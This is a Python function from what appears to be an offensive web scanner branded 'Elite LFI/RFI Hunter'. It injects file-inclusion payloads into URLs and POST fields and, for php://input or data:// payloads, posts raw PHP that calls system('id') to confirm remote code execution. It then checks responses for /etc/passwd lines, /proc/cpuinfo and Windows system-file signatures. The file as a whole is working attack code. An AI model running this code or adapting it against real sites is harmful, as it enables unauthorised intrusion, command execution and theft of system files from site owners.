from core import Requester, logger
from typing import Optional, Dict, Any

def check_traversal(
    payload: str,
    base_url: str,
    method: str = "GET",
    post_data: Optional[Dict[str, Any]] = None,
    cookies: Optional[Dict[str, str]] = None,
    headers: Optional[Dict[str, str]] = None
) -> Optional[str]:
    """
    Elite LFI/RFI Hunter v4.0 — The "Total Football" Edition.
    Supports: URL, POST Body Injection, php://input Auto-RCE, and Header Poisoning.
    """

    # ———— 1. Build Target URL ————
    # Only modify URL if {PAYLOAD} placeholder exists
    target = base_url
    if "{PAYLOAD}" in base_url:
        target = base_url.replace("{PAYLOAD}", payload)

    # ———— 2. Prepare Data & Method ————
    effective_method = method.upper()
    effective_data = post_data
    effective_headers = headers.copy() if headers else {}

    # [Tactical Fix] Inject Payload into POST Data Dictionary
    # This fixes the "False 9" bug. We swap {PAYLOAD} inside the dictionary values.
    if post_data and isinstance(post_data, dict):
        effective_data = post_data.copy() # Don't mutate the original
        for key, value in effective_data.items():
            if isinstance(value, str) and "{PAYLOAD}" in value:
                effective_data[key] = value.replace("{PAYLOAD}", payload)

    # [Scenario 2] "php://input" Auto-Switch
    # If using the input wrapper, we MUST switch to POST and send raw PHP.
    if "php://input" in payload or "data://" in payload:
        effective_method = "POST"
        effective_data = "<?php echo 'RCE_CONFIRMED_SANCHEZ'; system('id'); die(); ?>"
        # Ensure Content-Type is set for raw body
        effective_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

    # ———— 3. Fire the Shot ————
    req = Requester()
    try:
        if effective_method == "POST":
            res = req.post(
                url=target,
                data=effective_data,
                cookies=cookies,
                headers=effective_headers,
                allow_redirects=False,
                timeout=12
            )
        else:
            res = req.get(
                url=target,
                cookies=cookies,
                headers=effective_headers,
                allow_redirects=False,
                timeout=12
            )
    except Exception:
        # Connection failed completely (timeout, reset)
        return None

    # [Tactical Fix] Trust Issues Removed
    # We check the BODY regardless of status code (200, 403, 500 can all leak data)
    if not res:
        return None

    content = res.text
    size = len(content)

    # ———— 4. VAR Review (Signature Detection) ————
    
    # A. RCE Indicators (The "Hat Trick")
    rce_indicators = [
        "RCE_CONFIRMED_SANCHEZ",
        "uid=", "gid=", "www-data", "apache", "nobody",
        "root@", "CMD_EXEC", "system_check"
    ]
    # Check if we got code execution
    if "uid=" in content and "gid=" in content:
        return f"🚨 RCE ACHIEVED → {target} ({size:,} bytes)"
    if "RCE_CONFIRMED_SANCHEZ" in content:
        return f"🚨 RCE ACHIEVED [php://input] → {target}"

    # B. Linux LFI Signatures
    linux_lfi = [
        "root:x:0:0:", "daemon:x:", "bin:x:", "sys:x:",
        "/bin/bash", "/bin/sh", "/etc/passwd", 
        "Model name:", "Cpu MHz:" # /proc/cpuinfo
    ]
    if any(sig in content for sig in linux_lfi):
        return f"🔥 LFI (Linux) → {target} ({size:,} bytes)"

    # C. Windows LFI Signatures
    windows_lfi = [
        "[boot loader]", "multi(0)disk(0)", "c:\\windows\\system32",
        "nt authority\\system", "administrators:", 
        "The volume label is" # cmd.exe output
    ]
    if any(sig.lower() in content.lower() for sig in windows_lfi):
        return f"🔥 LFI (Windows) → {target} ({size:,} bytes)"

    # No goal. Play on.
    return None